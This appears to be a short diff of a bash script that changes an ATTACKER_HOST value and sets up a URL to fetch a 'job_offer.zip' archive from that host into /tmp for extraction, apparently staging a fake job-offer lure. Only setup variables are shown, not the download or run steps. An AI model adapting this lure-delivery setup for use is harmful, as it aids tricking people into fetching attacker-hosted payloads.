@@ -1,6 +1,6 @@
 #!/bin/bash
 
-ATTACKER_HOST="127.0.0.1"  
+ATTACKER_HOST="10.0.0.1"  
 ARCHIVE_URL="http://$ATTACKER_HOST:8000/job_offer.zip"
 DOWNLOAD_PATH="/tmp/job_offer.zip"
 EXTRACT_DIR="/tmp/job_offer_files"
